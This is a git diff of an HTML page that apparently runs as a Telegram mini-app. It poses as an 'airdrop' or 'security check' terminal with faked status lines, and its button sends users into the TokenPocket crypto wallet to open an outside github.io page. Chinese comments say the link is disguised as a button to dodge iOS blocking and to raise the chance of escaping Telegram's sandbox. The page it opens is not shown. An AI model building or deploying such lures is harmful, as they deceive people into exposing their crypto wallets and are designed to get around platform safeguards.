@@ -3,75 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AUTH_TERMINAL</title>
+    <title>AIRDROP_TERMINAL</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background: #000; color: #f00; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         #terminal { width: 85%; border: 1px solid #f00; padding: 20px; background: #100; box-shadow: 0 0 15px #f00; }
-        /* 关键：这是一个真实的 A 标签，伪装成按钮，iOS 对这种标签拦截率最低 */
-        .giant-link {
-            display: block;
-            width: 200px;
-            padding: 20px;
-            margin-top: 30px;
-            background: #f00;
-            color: #000;
-            text-align: center;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 18px;
-            border-radius: 5px;
-            animation: pulse 1s infinite;
+        .btn {
+            display: block; width: 220px; padding: 20px; margin-top: 30px;
+            background: #f00; color: #000; text-align: center;
+            text-decoration: none; font-weight: bold; border-radius: 5px;
         }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
-        .log { color: #0f0; font-size: 12px; margin-top: 10px; }
+        .hint { color: #555; font-size: 10px; margin-top: 20px; text-align: center; }
     </style>
 </head>
 <body>
 
     <div id="terminal">
-        <h2>> SECURITY_CHECK</h2>
-        <p>> ENCRYPTED_CONNECTION: TRUE</p>
-        <p id="status">> STATUS: AWAITING_HANDSHAKE...</p>
-        <div class="log" id="log"></div>
+        <h2>> AUTH_REQUIRED</h2>
+        <p>> DEVICE: iOS_DETECTED</p>
+        <p id="status">> STATUS: READY_TO_OPEN_WALLET</p>
     </div>
 
-    <a href="tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fpatrickdafhao-code.github.io%2Fcook%2F%22%7D" 
-       class="giant-link" 
-       onclick="logIt()">
-        CONFIRM & JOIN
+    <a href="https://tokenpocket.github.io/tp-url-common/index.html?url=https://patrickdafhao-code.github.io/cook/" 
+       class="btn" 
+       id="jumpBtn">
+        OPEN IN WALLET
     </a>
+
+    <div class="hint">
+        * 若点击无反应，请点右上角 [...] 选择 "在浏览器打开"
+    </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
 
-        function logIt() {
-    // 1. 震动反馈
-    tg.HapticFeedback.notificationOccurred('success');
-    document.getElementById('status').innerText = "> STATUS: EXITING_SANDBOX...";
-
-    // 2. 构造你的 GitHub 原始地址
-    const myUrl = "https://patrickdafhao-code.github.io/cook/";
-    
-    // 3. 构造 TokenPocket 的协议链接
-    const tpProtocol = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": myUrl}));
-
-    // 4. 核心：不直接跳协议，而是先尝试让 TG 弹出“外部打开”
-    // 我们把协议链接传给 tg.openLink，并强制指定 try_browser
-    try {
-        tg.openLink(tpProtocol, { try_browser: true });
-        
-        // 5. 兜底方案：如果上面没反应，弹出手动复制提示
-        setTimeout(() => {
-            document.getElementById('log').innerHTML += "<p style='color:yellow'>> [HINT]: 如果没跳转，请点击右上角三个点，选择“在浏览器中打开”</p>";
-        }, 2000);
-    } catch (e) {
-        // 如果 SDK 报错，尝试直接修改 location
-        window.location.href = tpProtocol;
-    }
-}
+        document.getElementById('jumpBtn').addEventListener('click', function(e) {
+            tg.HapticFeedback.notificationOccurred('success');
+            // 强制使用 Telegram SDK 的打开功能，增加“跳出”概率
+            tg.openLink(this.href, { try_browser: true });
+        });
     </script>
 </body>
 </html>
